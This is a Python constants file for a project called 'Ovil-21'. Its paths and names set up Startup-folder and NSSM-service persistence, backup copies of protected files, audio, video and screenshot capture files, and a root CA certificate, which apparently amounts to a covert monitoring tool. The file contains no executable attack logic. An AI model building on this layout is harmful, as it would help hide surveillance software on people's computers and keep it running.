# TODO: update paths to be correct
PROJECT_NAME = "Ovil-21"
OVIL_PATH = "C:\\ovil-21.exe"
import os
DEFAULT_USER_NAME = os.getlogin()
ALT_OVIL_PATH = rf"C:\Users\{DEFAULT_USER_NAME}\output\alt\ovil-21.exe"
FFMPEG_PATH = rf"C:\Users\{DEFAULT_USER_NAME}\output\ffmpeg.exe"
FFMPEG_PATH_ALT = rf"C:\Users\{DEFAULT_USER_NAME}\output\alt\ffmpeg.exe"
ROOT_DIRECTORY = rf"C:\Users\{DEFAULT_USER_NAME}\output"
ALTERNATE_ROOT_DIRECTORY = rf"{ROOT_DIRECTORY}\alt"
CERT_FOLDER = r"..\folder"
ROOT_CA_NAME = "root_ca"

# DEFAULT_COMPUTER_NAME = "___Computer_name___"
START_UP_FOLDER = rf"C:\Users\{DEFAULT_USER_NAME}\AppData\Roaming\Microsoft\Windows\Stafrt Menu\Programs\Startup"
ALT_START_UP_FOLDER = rf"C:\Users\{DEFAULT_USER_NAME}\output\alt"
SERVICE_NAME = "service"
SERVICE_PATH = rf"C:\Users\{DEFAULT_USER_NAME}\output"
NSSM_PATH = rf"C:\Users\{DEFAULT_USER_NAME}\output\nssm.exe"
ALTERNATE_NSSM_PATH = rf"C:\Users\{DEFAULT_USER_NAME}\output\alt\nssm.exe"
ALTERNATE_SERVICE_PATH = rf"C:\Users\{DEFAULT_USER_NAME}\output\alt"
SERVICE_PATHS = [(f"{SERVICE_PATH}\\{SERVICE_NAME}1.exe", f"{ALTERNATE_SERVICE_PATH}\\{SERVICE_NAME}1.exe"), (f"{SERVICE_PATH}\\{SERVICE_NAME}2.exe", f"{ALTERNATE_SERVICE_PATH}\\{SERVICE_NAME}2.exe"), (NSSM_PATH, ALTERNATE_NSSM_PATH)]
PROTECTED_FILES = SERVICE_PATHS + [(FFMPEG_PATH, FFMPEG_PATH_ALT), (OVIL_PATH, ALT_OVIL_PATH), (f"{START_UP_FOLDER}\\{PROJECT_NAME}.lnk", f"{ALT_START_UP_FOLDER}\\{PROJECT_NAME}.lnk")]
PROTECTED_DIRS = [(ROOT_DIRECTORY, ALTERNATE_ROOT_DIRECTORY)]
DEFAULT_AUDIO_NAME = "temp_audio.wav"
DEFAULT_VIDEO_NAME = "temp_video.avi"
DEFAULT_VIDEO_AUDIO_NAME = "video_audio.mkv"
DEFAULT_SCREENSHOT_NAME = "screenshot.jpg"
OPENSSL_PATH = "openssl"
